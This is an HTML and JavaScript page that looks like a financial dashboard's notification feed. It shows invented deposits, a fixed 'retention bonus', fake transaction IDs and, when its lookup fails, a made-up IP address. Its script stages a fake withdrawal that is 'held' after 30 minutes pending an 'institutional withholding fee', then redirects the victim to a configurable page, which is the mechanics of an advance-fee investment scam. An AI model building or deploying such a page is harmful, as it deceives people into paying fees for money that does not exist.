<!DOCTYPE html>  
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Notifications - Activity Feed</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />

  <style>
    /* ---------- Floating Background ---------- */
    #floating-bg {
        position: fixed;
        inset: 0;
        z-index: 0;
        pointer-events: none;

        /* Soft white/blue futuristic background */
        background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);

        overflow: hidden;
    }

    .particle {
        position: absolute;
        border-radius: 50%;
        opacity: 0.6;

        animation: floatParticles linear infinite;

        /* Soft futuristic glow */
        background: rgba(120, 180, 255, 0.7);
        box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
    }

    @keyframes floatParticles {
        0% {
            transform: translateY(100vh) scale(0.3);
            opacity: 0;
        }

        50% {
            opacity: 1;
        }

        100% {
            transform: translateY(-10vh) scale(1);
            opacity: 0;
        }
    }
  </style>
</head>
<body class="min-h-screen font-sans antialiased text-slate-800">

  <!-- Floating Background Container -->
  <div id="floating-bg"></div>

  <!-- Main Content Wrapper -->
  <div class="relative z-10 max-w-4xl mx-auto px-4 py-8">
    
    <!-- Header -->
    <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-sky-200/80 backdrop-blur-sm">
      <div>
        <h1 class="text-2xl font-bold text-slate-900 flex items-center gap-2">
          <i class="fa-solid me-2 fa-bell text-blue-600"></i> Notifications
          <span id="unread-count" class="text-xs bg-blue-100 text-blue-700 px-2.5 py-0.5 rounded-full font-semibold border border-blue-200">
            3 unread
          </span>
        </h1>
        <p class="text-sm text-slate-600 mt-1">Track your sign-ins, security updates, and withdrawal transactions.</p>
      </div>
      <div class="flex items-center gap-2">
        <button onclick="markAllAsRead()" class="text-xs font-medium text-slate-600 hover:text-blue-600 px-3 py-2 rounded-lg bg-white/80 hover:bg-white shadow-sm border border-slate-200 transition">
          <i class="fa-solid fa-check-double me-1"></i> Mark all read
        </button>
        <button onclick="clearAllNotifications()" class="text-xs font-medium text-rose-600 hover:text-rose-700 px-3 py-2 rounded-lg bg-rose-50/80 hover:bg-rose-100 shadow-sm border border-rose-200 transition">
          <i class="fa-solid fa-trash-can me-1"></i> Clear all
        </button>
      </div>
    </div>

    <!-- Filters -->
    <div class="flex items-center gap-2 my-6 overflow-x-auto pb-2 scrollbar-none">
      <button onclick="filterNotifications('all', this)" class="filter-btn active text-sm font-medium px-4 py-2 rounded-xl bg-blue-600 text-white shadow-md shadow-blue-500/20 transition">
        All Activity
      </button>

      <button onclick="filterNotifications('withdrawal', this)" class="filter-btn text-sm font-medium px-4 py-2 rounded-xl bg-white/80 text-slate-600 hover:text-slate-900 border border-slate-200/80 shadow-sm transition">
        Withdrawals
      </button>

      <button onclick="filterNotifications('signin', this)" class="filter-btn text-sm font-medium px-4 py-2 rounded-xl bg-white/80 text-slate-600 hover:text-slate-900 border border-slate-200/80 shadow-sm transition">
        Sign-ins
      </button>

      <button onclick="filterNotifications('unread', this)" class="filter-btn text-sm font-medium px-4 py-2 rounded-xl bg-white/80 text-slate-600 hover:text-slate-900 border border-slate-200/80 shadow-sm transition">
        Unread
      </button>
    </div>

    <!-- Notification List Container -->
    <div id="notifications-list" class="space-y-3">
      <!-- Items dynamically rendered via JS -->
    </div>
  </div>

 <script>
    /* ---------- Floating Particles ---------- */
    const container = document.getElementById('floating-bg');
    if (container) {
        for (let i = 0; i < 60; i++) {
            const p = document.createElement('div');
            p.className = 'particle';
            const size = Math.random() * 20 + 10;
            p.style.width = size + 'px';
            p.style.height = size + 'px';
            p.style.left = Math.random() * 100 + 'vw';
            p.style.animationDuration = (Math.random() * 20 + 10) + 's';
            container.appendChild(p);
        }
    }

    // ==========================================
// 🕒 DYNAMIC DATA SYNCHRONIZATION WITH REAL-TIME TICKER
// ==========================================

// 🎯 REDIRECTION TARGET FOR STAGE 3 CLEARANCE HOLD
const CLEARANCE_REDIRECT_URL = ""; // Change to your desired page
const ENABLE_AUTO_REDIRECT = false;             // Set to true for automatic timer redirect
const AUTO_REDIRECT_DELAY_MS = 5000;           // 5-second countdown if auto-redirect is true

const originalDocumentTitle = document.title || "Dashboard";
let titleInterval = null;
let syncTicker = null; // Background polling handle
let autoRedirectTimer = null;

if ("Notification" in window && Notification.permission !== "granted" && Notification.permission !== "denied") {
    Notification.permission !== "denied" && Notification.requestPermission();
}

function triggerDesktopNotification(title, body) {
    if ("Notification" in window && Notification.permission === "granted") {
        try {
            const notification = new Notification(title, {
                body: body,
                icon: "/favicon.ico",
                tag: "dashboard-alert",
                renotify: true
            });

            notification.onclick = function () {
                window.focus();
                this.close();
            };
        } catch (e) {
            console.warn("Desktop notification error:", e);
        }
    }
}

function stopTitleFlashing() {
    if (titleInterval) {
        clearInterval(titleInterval);
        titleInterval = null;
    }
}

function startTitleFlashing(count) {
    stopTitleFlashing();
    if (!document.hidden || count === 0) return;
    
    let toggle = false;
    titleInterval = setInterval(() => {
        document.title = toggle ? `🔔 (${count}) New Notification!` : `(${count}) ${originalDocumentTitle}`;
        toggle = !toggle;
    }, 1000);
}

document.addEventListener("visibilitychange", () => {
    if (!document.hidden) {
        stopTitleFlashing();
        updateUnreadBadge();
        initDynamicNotifications();
    } else {
        const count = window.notifications ? window.notifications.filter(n => !n.isRead).length : 0;
        if (count > 0) {
            startTitleFlashing(count);
        }
    }
});

window.addEventListener("focus", () => {
    stopTitleFlashing();
    if (window.notifications) {
        const unreadCount = window.notifications.filter(n => !n.isRead).length;
        if (unreadCount > 0) {
            updateUnreadBadge();
        }
    }
});

// React instantly to cross-tab updates without reloading the entire page
window.addEventListener("storage", (event) => {
    if (["av_read_notifs", "av_deleted_notifs", "av_withdrawal_tx", "av_withdrawn", "av_force_hold"].includes(event.key)) {
        initDynamicNotifications();
    }
});

function handleHoldRedirect() {
    window.location.href = CLEARANCE_REDIRECT_URL;
}

async function initDynamicNotifications() {
    let userIp = localStorage.getItem("av_user_ip");
    if (!userIp) {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            if (data.ip) userIp = data.ip;
        } catch (e) {
            userIp = `102.${Math.floor(Math.random() * 50 + 50)}.${Math.floor(Math.random() * 200)}.${Math.floor(Math.random() * 200)}`;
        }
        localStorage.setItem("av_user_ip", userIp);
    }

    let savedVisitTime = localStorage.getItem("av_initial_visit");
    if (!savedVisitTime) {
        savedVisitTime = Date.now().toString();
        localStorage.setItem("av_initial_visit", savedVisitTime);
    }
    const visitDate = new Date(parseInt(savedVisitTime, 10));

    const formatTimestamp = (dateObj) => {
        const dateStr = dateObj.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
        const timeStr = dateObj.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', hour12: true });
        return `${dateStr} • ${timeStr}`;
    };

    const currentSignInTime = formatTimestamp(new Date());
    const previousSignInTime = formatTimestamp(visitDate);
    const bonusCreditedTime = formatTimestamp(new Date(visitDate.getTime() - (2 * 60 * 60 * 1000)));
    const coreDepositTime = formatTimestamp(new Date(visitDate.getTime() - (24 * 60 * 60 * 1000)));

    const isWithdrawn = localStorage.getItem("av_withdrawn") === "true" || localStorage.getItem("av_is_withdrawn") === "true";
    let storedWithdrawalTime = localStorage.getItem("av_withdrawal_time");

    let withdrawalTx = {};
    try {
        withdrawalTx = JSON.parse(localStorage.getItem("av_withdrawal_tx") || "{}");
    } catch (e) {}

    const withdrawalSource = withdrawalTx.sourceType || "available";

    const defaultBonusVal = typeof DEFAULT_RETENTION_BONUS !== 'undefined' ? DEFAULT_RETENTION_BONUS : 7533.32;
    const defaultBaseVal = typeof BASE_ACU !== 'undefined' ? BASE_ACU : 0.00;

    const rawAcu = localStorage.getItem("totalACU") || localStorage.getItem("baseACU");
    const currentAcu = rawAcu !== null ? parseFloat(rawAcu) : defaultBaseVal;

    const rawBonus = localStorage.getItem("av_retention_bonus");
    const retentionBonus = rawBonus !== null ? parseFloat(rawBonus) : defaultBonusVal;

    const historicalDepositVal = withdrawalTx.amountCAD || (currentAcu > 0 ? currentAcu : defaultBaseVal);
    const historicalBonusVal = withdrawalTx.amountCAD || (retentionBonus > 0 ? retentionBonus : defaultBonusVal);

    const formattedAcu = historicalDepositVal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    const formattedBonus = historicalBonusVal.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

    const withdrawnAmount = withdrawalTx.amountCAD || (withdrawalSource === "bonus" ? historicalBonusVal : historicalDepositVal);
    const formattedWithdrawnAmount = withdrawnAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });

    let formattedWithdrawalTime = currentSignInTime;
    if (storedWithdrawalTime) {
        formattedWithdrawalTime = storedWithdrawalTime.replace(',', ' •');
    }

    const getPersistentTxRef = (key, prefix) => {
        let ref = localStorage.getItem(key);
        if (!ref) {
            ref = prefix + Math.floor(10000000 + Math.random() * 90000000);
            localStorage.setItem(key, ref);
        }
        return ref;
    };

    const bonusTxRef = getPersistentTxRef("av_bonus_tx_ref", "TXN-BONUS");
    const coreDepTxRef = getPersistentTxRef("av_dep_tx_ref", "TXN-DEP");
    const holdTxRef = getPersistentTxRef("av_hold_tx_ref", "TXN-7533-CLR");
    const routingTxRef = getPersistentTxRef("av_routing_tx_ref", "BATCH-CLR-");

    let generatedNotifications = [
      {
        id: 1, type: "signin", category: "security", title: "Current Sign-in Session",
        description: "Active session initiated on this device.", timestamp: currentSignInTime, isRead: false, ipAddress: userIp
      }
    ];

    let stage3Active = false;

    if (isWithdrawn) {
      let baseWithdrawalMs = storedWithdrawalTime ? new Date(storedWithdrawalTime).getTime() : Date.now();
      if (isNaN(baseWithdrawalMs)) baseWithdrawalMs = Date.now();
      const elapsedMinutes = Math.floor((Date.now() - baseWithdrawalMs) / (1000 * 60));

      // STAGE 3: Bad News — Triggered at 30+ minutes
      if (elapsedMinutes >= 30 || localStorage.getItem("av_force_hold") === "true") {
        stage3Active = true;
        const stage3Time = formatTimestamp(new Date(baseWithdrawalMs + (35 * 60 * 1000)));
        generatedNotifications.push({
          id: 10, type: "withdrawal", category: "failed", title: "Action Required: Intermediary Clearance Hold",
          description: `Your transfer of <strong>$${formattedWithdrawnAmount} USD</strong> has been intercepted by the cross-border clearing layer. Institutional withholding fee required prior to release.`,
          timestamp: stage3Time, isRead: false, txRef: holdTxRef, isActionRequired: true
        });
      }

      // STAGE 2: Intermediate Good News — Triggered at 5+ minutes
      if (elapsedMinutes >= 5 || localStorage.getItem("av_force_hold") === "true") {
        const stage2Time = formatTimestamp(new Date(baseWithdrawalMs + (7 * 60 * 1000)));
        generatedNotifications.push({
          id: 9, type: "withdrawal", category: "pending", title: "Intermediary Network Routing",
          description: `Transaction batch <strong>#${routingTxRef}</strong> dispatched to cross-border settlement rail. Estimated release: 2-4 hours.`,
          timestamp: stage2Time, isRead: elapsedMinutes >= 30, txRef: routingTxRef
        });
      }

      // STAGE 1: Immediate Processing
      generatedNotifications.push({
        id: 2, type: "withdrawal", category: "success", title: "Funds Withdrawal Processing",
        description: `Your withdrawal request of <strong>$${formattedWithdrawnAmount} USD</strong> is being routed to your destination wallet/bank.`,
        timestamp: formattedWithdrawalTime, isRead: elapsedMinutes >= 5, txRef: withdrawalTx.txHash || "av_tx_unknown"
      });
    }

    if (retentionBonus > 0 || (isWithdrawn && withdrawalSource === "bonus")) {
      generatedNotifications.push({
        id: 3, type: "deposit", category: "success", title: "Retention Bonus Credited",
        description: `Retention bonus allocation of <strong>$${formattedBonus} USD (${formattedBonus} ACU)</strong> has been successfully credited to your account.`,
        timestamp: bonusCreditedTime, isRead: true, txRef: bonusTxRef
      });
    }

    generatedNotifications.push({
      id: 4, type: "signin", category: "security", title: "Previous Account Sign-in",
      description: "Successful login session recorded.", timestamp: previousSignInTime, isRead: true, ipAddress: userIp
    });

    if (currentAcu > 0 || (isWithdrawn && withdrawalSource === "available")) {
      generatedNotifications.push({
        id: 5, type: "deposit", category: "success", title: "Core Balance Allocation",
        description: `Core available deposit of <strong>$${formattedAcu} USD</strong> settled to wallet account.`,
        timestamp: coreDepositTime, isRead: true, txRef: coreDepTxRef
      });
    }

    const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
    const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');

    const previousCount = window.notifications ? window.notifications.length : 0;

    window.notifications = generatedNotifications
        .filter(n => !deletedIds.includes(n.id))
        .map(n => {
            if (readIds.includes(n.id)) n.isRead = true;
            return n;
        });

    // Broadcast generated active notification IDs to sub-page watchers
    localStorage.setItem('av_active_notifs_cache', JSON.stringify(generatedNotifications.map(n => ({ id: n.id }))));

    // Detect if a new notification dynamic stage just appeared in real-time
    if (window.notifications.length > previousCount && previousCount > 0) {
        const newlyAdded = window.notifications[0];
        if (newlyAdded && !newlyAdded.isRead) {
            triggerDesktopNotification("New Alert", newlyAdded.title);
        }
    }

    // AUTO-REDIRECT TIMER (If enabled and Stage 3 hold is active)
    if (ENABLE_AUTO_REDIRECT && stage3Active && !readIds.includes(10)) {
        if (!autoRedirectTimer) {
            autoRedirectTimer = setTimeout(() => {
                handleHoldRedirect();
            }, AUTO_REDIRECT_DELAY_MS);
        }
    }

    renderNotifications();
}

let currentFilter = 'all';

function getIcon(type, category) {
  if (type === 'deposit') {
    return { icon: 'fa-arrow-up-right-from-square fa-rotate-180', bg: 'bg-emerald-50 text-emerald-600 border-emerald-200' };
  }
  if (type === 'withdrawal') {
    if (category === 'success') return { icon: 'fa-arrow-up-right-from-square', bg: 'bg-emerald-50 text-emerald-600 border-emerald-200' };
    if (category === 'pending') return { icon: 'fa-clock', bg: 'bg-amber-50 text-amber-600 border-amber-200' };
    if (category === 'failed') return { icon: 'fa-triangle-exclamation', bg: 'bg-rose-50 text-rose-600 border-rose-200' };
  }
  if (type === 'signin') {
    return { icon: 'fa-shield-halved', bg: 'bg-sky-50 text-sky-600 border-sky-200' };
  }
  return { icon: 'fa-bell', bg: 'bg-blue-50 text-blue-600 border-blue-200' };
}

function renderNotifications() {
  const containerList = document.getElementById('notifications-list');
  
  if (!containerList) {
    updateUnreadBadge();
    return;
  }

  if (!window.notifications) return;

  const filtered = window.notifications.filter(item => {
    if (currentFilter === 'unread') return !item.isRead;
    if (currentFilter === 'withdrawal') return item.type === 'withdrawal';
    if (currentFilter === 'deposit') return item.type === 'deposit';
    if (currentFilter === 'signin') return item.type === 'signin';
    return true;
  });

  if (filtered.length === 0) {
    containerList.innerHTML = `
      <div class="text-center py-12 bg-white/70 backdrop-blur-md rounded-2xl border border-white/80 shadow-sm">
        <i class="fa-regular fa-bell-slash text-4xl text-slate-400 mb-3"></i>
        <p class="text-slate-600 font-medium">No notifications found</p>
        <p class="text-xs text-slate-400 mt-1">There is no activity matching your current selection.</p>
      </div>
    `;
    updateUnreadBadge();
    return;
  }

  containerList.innerHTML = filtered.map(item => {
    const style = getIcon(item.type, item.category);
    return `
      <div class="group relative flex gap-4 p-4 rounded-2xl border backdrop-blur-md transition-all duration-200 ${
        item.isRead ? 'bg-white/50 border-white/60 opacity-80 shadow-sm' : 'bg-white/85 border-white shadow-md shadow-blue-900/5'
      }">
        <div class="w-10 h-10 rounded-xl flex items-center justify-center shrink-0 border ${style.bg}">
          <i class="fa-solid ${style.icon} text-base"></i>
        </div>
        <div class="flex-1 min-w-0">
          <div class="flex items-center justify-between gap-2 mb-1">
            <h3 class="text-sm font-semibold text-slate-900 flex items-center gap-2">
              ${item.title}
              ${!item.isRead ? '<span class="w-2 h-2 rounded-full bg-blue-600 inline-block"></span>' : ''}
            </h3>
            <span class="text-xs text-slate-500 shrink-0">${item.timestamp}</span>
          </div>
          <p class="text-xs text-slate-600 leading-relaxed">${item.description}</p>
          <div class="flex items-center gap-2 mt-2">
            ${item.txRef ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">Ref: ${item.txRef}</span>` : ''}
            ${item.ipAddress ? `<span class="text-[11px] font-mono text-slate-600 bg-slate-100/80 px-2 py-0.5 rounded border border-slate-200">IP: ${item.ipAddress}</span>` : ''}
          </div>
          ${item.isActionRequired ? `
            <div class="mt-3">
              <button onclick="toggleRead(10)" class="inline-flex items-center gap-2 px-3 py-1.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-medium rounded-lg transition shadow-sm">
                <span>Resolve Clearance Hold</span>
                <i class="fa-solid fa-arrow-right text-[10px]"></i>
              </button>
            </div>
          ` : ''}
        </div>
        <div class="flex flex-col justify-between items-end gap-2 shrink-0">
          <button onclick="toggleRead(${item.id})" title="${item.isRead ? 'Mark as unread' : 'Mark as read'}" class="text-slate-400 hover:text-blue-600 transition text-sm">
            <i class="fa-solid ${item.isRead ? 'fa-envelope' : 'fa-envelope-open'}"></i>
          </button>
          <button onclick="deleteNotification(${item.id})" title="Delete notification" class="text-slate-400 hover:text-rose-500 transition text-xs opacity-0 group-hover:opacity-100">
            <i class="fa-solid fa-xmark text-sm"></i>
          </button>
        </div>
      </div>
    `;
  }).join('');

  updateUnreadBadge();
}

function filterNotifications(filter, btn) {
  currentFilter = filter;
  document.querySelectorAll('.filter-btn').forEach(b => {
    b.classList.remove('bg-blue-600', 'text-white', 'shadow-md', 'shadow-blue-500/20');
    b.classList.add('bg-white/80', 'text-slate-600', 'border', 'border-slate-200/80', 'shadow-sm');
  });
  btn.classList.remove('bg-white/80', 'text-slate-600', 'border', 'border-slate-200/80', 'shadow-sm');
  btn.classList.add('bg-blue-600', 'text-white', 'shadow-md', 'shadow-blue-500/20');
  renderNotifications();
}

function updateReadStorage(id, isRead) {
    let readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
    if (isRead && !readIds.includes(id)) readIds.push(id);
    if (!isRead) readIds = readIds.filter(storedId => storedId !== id);
    localStorage.setItem('av_read_notifs', JSON.stringify(readIds));
}

function toggleRead(id) {
  window.notifications = window.notifications.map(item => {
      if (item.id === id) {
          const newState = !item.isRead;
          updateReadStorage(item.id, newState);
          return { ...item, isRead: newState };
      }
      return item;
  });

  // REDIRECT TARGET: If notification #10 (Stage 3 Hold) is read/acted upon, redirect immediately
  if (id === 10) {
      handleHoldRedirect();
      return;
  }

  renderNotifications();
}

function markAllAsRead() {
  let containsStage3 = window.notifications.some(n => n.id === 10);
  window.notifications = window.notifications.map(item => {
      updateReadStorage(item.id, true);
      return { ...item, isRead: true };
  });
  
  if (containsStage3) {
      handleHoldRedirect();
      return;
  }

  renderNotifications();
}

function clearAllNotifications() {
  let deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
  window.notifications.forEach(n => {
      if (!deletedIds.includes(n.id)) deletedIds.push(n.id);
  });
  localStorage.setItem('av_deleted_notifs', JSON.stringify(deletedIds));
  
  window.notifications = [];
  renderNotifications();
}

function deleteNotification(id) {
  let deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
  if (!deletedIds.includes(id)) {
      deletedIds.push(id);
      localStorage.setItem('av_deleted_notifs', JSON.stringify(deletedIds));
  }
  
  window.notifications = window.notifications.filter(item => item.id !== id);
  renderNotifications();
}

function updateUnreadBadge() {
  if (!window.notifications) return;
  const count = window.notifications.filter(n => !n.isRead).length;
  const badge = document.getElementById('unread-count');
  
  if (badge) {
    badge.textContent = `${count} unread`;
    if (count === 0) {
      badge.classList.add('hidden');
    } else {
      badge.classList.remove('hidden');
    }
  }

  if (document.hidden && count > 0) {
    startTitleFlashing(count);
  } else {
    stopTitleFlashing();
    if (count > 0) {
      document.title = `(${count}) ${originalDocumentTitle}`;
    } else {
      document.title = originalDocumentTitle;
    }
  }
}

// ==========================================
// 🚀 INITIALIZATION & CONTINUOUS POLLING
// ==========================================

initDynamicNotifications();

if (syncTicker) clearInterval(syncTicker);
syncTicker = setInterval(() => {
    initDynamicNotifications();
}, 10000);

</script>
</body>
</html>
